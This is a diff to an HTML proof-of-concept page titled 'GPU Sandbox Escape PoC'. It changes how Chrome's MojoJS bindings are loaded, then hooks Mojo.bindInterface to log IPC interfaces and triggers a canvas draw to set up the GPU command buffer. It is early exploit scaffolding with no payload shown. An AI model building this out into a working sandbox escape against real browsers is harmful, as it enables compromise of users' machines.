@@ -2,40 +2,49 @@
 <html>
 <head>
     <title>GPU Sandbox Escape PoC</title>
-    
-    <!-- ES6 Import Map: Paths MUST start with ./ -->
-    <script type="importmap">
-        {
-            "imports": {
-                "mojo_bindings": "./gen/mojo/public/js/bindings.js",
-                "gpu_channel": "./gen/gpu/ipc/common/gpu_channel.mojom.js"
-            }
-        }
-    </script>
 </head>
 <body>
-    <h1>MojoJS ES6 Module Loader1</h1>
+    <h1>MojoJS ES6 Module Loader</h1>
     <canvas id="target-canvas" width="10" height="10"></canvas>
     
-    <!-- MUST use type="module" when using imports -->
     <script type="module">
-        import { Mojo } from 'mojo_bindings';
+        // 1. Import the lowercase 'mojo' from bindings.js
+        import { mojo } from './gen/mojo/public/js/bindings.js';
         
-        console.log("[+] Mojo API loaded successfully: ", Mojo);
+        // 2. Make it global so gpu_channel.mojom.js can find it!
+        window.mojo = mojo;
+        console.log("[+] mojo namespace exposed globally");
 
-        // Let's see if we can intercept the GPU channel creation natively
-        const original_bind = Mojo.bindInterface;
-        Mojo.bindInterface = function(interfaceName, pipe, host) {
-            console.log("[*] Intercepted Mojo Interface: " + interfaceName);
-            return original_bind(interfaceName, pipe, host);
+        // 3. Dynamically load gpu_channel.mojom.js AFTER window.mojo is set
+        const script = document.createElement('script');
+        script.src = './gen/gpu/ipc/common/gpu_channel.mojom.js';
+        
+        script.onload = () => {
+            console.log("[+] gpu_channel.mojom.js loaded successfully!");
+            startExploit();
         };
+        document.head.appendChild(script);
 
-        setTimeout(() => {
-            console.log("[*] Initializing Canvas to trigger IPC...");
-            const canvas = document.getElementById('target-canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.fillRect(0, 0, 10, 10);
-        }, 1000);
+        // 4. The actual exploit logic
+        function startExploit() {
+            // The native 'Mojo' (uppercase) is automatically provided by Chrome
+            console.log("[+] Native Mojo API: ", window.Mojo);
+
+            // Hook the bindInterface function
+            const original_bind = window.Mojo.bindInterface;
+            window.Mojo.bindInterface = function(interfaceName, pipe, host) {
+                console.log("[*] Intercepted Mojo Interface: " + interfaceName);
+                return original_bind(interfaceName, pipe, host);
+            };
+
+            // Trigger the canvas to force Chrome to set up the GPU Command Buffer
+            setTimeout(() => {
+                console.log("[*] Initializing Canvas to trigger IPC...");
+                const canvas = document.getElementById('target-canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.fillRect(0, 0, 10, 10);
+            }, 1000);
+        }
     </script>
 </body>
 </html>
